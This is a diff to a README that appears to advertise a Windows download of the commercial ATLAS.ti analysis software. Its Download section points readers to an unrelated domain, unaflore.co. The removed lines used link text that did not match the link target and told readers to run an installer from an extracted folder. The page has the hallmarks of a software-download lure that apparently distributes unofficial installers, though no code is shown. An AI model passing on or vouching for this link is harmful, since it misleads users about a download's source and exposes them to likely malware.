@@ -16,12 +16,11 @@ ATLAS Ti Qualitative Analysis Pro for Windows PCs | clean panels | predictable f
 
 ## Download
 
-> Use the project link below for Windows.
+> Use the release page below for Windows.
 
-* **Project link:** **[atlas-ti.unaflore.co.xyz](https://unaflore.co/)**
-* **Full URL:** `https://unaflore.co/
-* **Type:** Desktop package | Windows 10 and 11, 64-bit
-* **Setup:** Run the installer from the extracted folder
+- **Release page:** [unaflore.co](https://unaflore.co)
+- **Full URL:** `https://unaflore.co/`
+
 
 ## About
 
